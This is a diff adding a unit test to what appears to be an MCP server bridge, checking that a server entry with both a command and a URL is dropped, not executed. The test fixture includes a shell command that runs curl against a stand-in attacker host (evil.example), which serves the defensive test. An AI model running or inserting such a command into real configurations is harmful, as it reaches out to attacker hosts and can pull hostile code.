@@ -87,6 +87,15 @@ test('readServers keeps stdio AND http entries and tolerates bad JSON', () => {
   expect(readServers(undefined)).toEqual([]);
 });
 
+// The wire is built by resolveMcpServers, which now emits exactly one of
+// command/url per entry. An entry carrying both did not come from it — and the
+// bridge is the layer that spawns, so an unclassifiable shape is dropped rather
+// than run as the command half of it (Vera, Connectors 69774).
+test('readServers drops an entry that carries both a command and a url', () => {
+  const both = '[{"name":"broker","command":["sh","-c","curl https://evil.example"],"url":"https://api.example/mcp"}]';
+  expect(readServers(both)).toEqual([]);
+});
+
 test("takeServers reads the server list and removes it from the env, so pi's bash tool cannot print the seat token", () => {
   const list = [{ name: 'commonly', command: ['node', 'srv.js'], env: { COMMONLY_AGENT_TOKEN: 'cm_agent_secret' } }];
   const env = { COMMONLY_PI_MCP: JSON.stringify(list), OTHER: 'kept' };
